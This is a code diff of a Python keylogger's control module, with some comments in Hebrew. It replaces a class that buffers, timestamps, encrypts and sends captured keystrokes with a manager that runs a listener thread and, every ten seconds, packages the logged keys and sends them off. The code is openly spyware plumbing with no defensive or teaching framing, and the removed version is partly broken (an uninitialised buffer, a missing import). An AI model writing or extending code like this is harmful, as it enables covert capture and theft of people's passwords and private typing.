@@ -1,45 +1,31 @@
-class KeyLoggerManager:
-    def __init__(self, keylogger_service, file_writer, encryptor, interval=5):
-        self.keylogger_service = keylogger_service
-        self.file_writer = file_writer
-        self.encryptor = encryptor
-        self.interval = interval  # כל כמה שניות לאסוף
-    def collect_keys(self):
-        keys = self.keylogger_service.get_keys()
-        if keys:
-            self.buffer.extend(keys)
+import threading
+from time import sleep
+from listener import Listener
+from data_collector import Package
+from file_creator import File
+from time_stamp import time_stamp
 
-
-
+class Manager:
+    def __init__(self):
+        self.listener = Listener()
+        self.process = threading.Thread(target=self.listener.run)
 
     def start(self):
-        self.running = True
-        self.keylogger_service.start_logging()
-        while self.running:
-            time.sleep(self.interval)
-            self.process_and_send()
+        self.process.start()
 
     def stop(self):
-        self.running = False
-        self.process_and_send()  # שולח את מה שנשאר לפני עצירה
-        self.keylogger_service.stop_logging()
+        self.listener.stop()
 
-    def add_timestamp(self, data):
-        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        return f"[{timestamp}] " + data
 
-    def encrypt_data(self, data):
-        return self.encryptor.encrypt(data)
+if __name__ == '__main__':
 
-    def process_and_send(self):
-        if not self.buffer:
-            return
-        raw_data = " ".join(self.buffer)
-        data_with_time = self.add_timestamp(raw_data)
-        encrypted = self.encrypt_data(data_with_time)
-        self.file_writer.send_data(encrypted, "Machine_1")
-        self.buffer.clear()
-
-    def shutdown(self):
-        self.stop()
-        print("System stopped. All data saved.")
+    p = Manager()
+    p.start()
+    while 1:
+        sleep(10)
+        data = p.listener.get_keys()
+        if data:
+            a = Package(data)
+            b = a.export_package()
+            f = File(time_stamp)
+            f.send_data(b)
